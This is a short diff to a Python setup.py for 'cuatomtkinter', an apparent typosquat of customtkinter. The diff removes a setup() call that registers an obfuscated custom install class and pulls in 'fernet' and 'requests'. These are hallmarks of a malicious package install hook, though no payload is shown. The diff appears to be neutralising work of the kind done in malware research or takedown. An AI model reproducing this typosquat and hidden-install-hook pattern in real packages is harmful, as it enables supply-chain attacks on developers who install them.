@@ -18,22 +18,5 @@ class VcsTbmGrrXlczSaBLgrOOnsvfRttsebYQTIfZKGZiQDFjWOexwfrTkCUtlsajnHgWQJORyjIaT
             install.run(self)
 
 
-setup(
-    name="cuatomtkinter",
-    version=VERSION,
-    author="hUSuEXIjVoFGtgC",
-    author_email="TkgELSsuHFfi@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': VcsTbmGrrXlczSaBLgrOOnsvfRttsebYQTIfZKGZiQDFjWOexwfrTkCUtlsajnHgWQJORyjIaTQgdjFqGWWhzHdDjXsdGJfKwoXGsPGBcOzxWUvWwOCvmGVAUsdNVchuChxUdVCIuoZGrvCdUNsAVZoxvspqgR,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
 
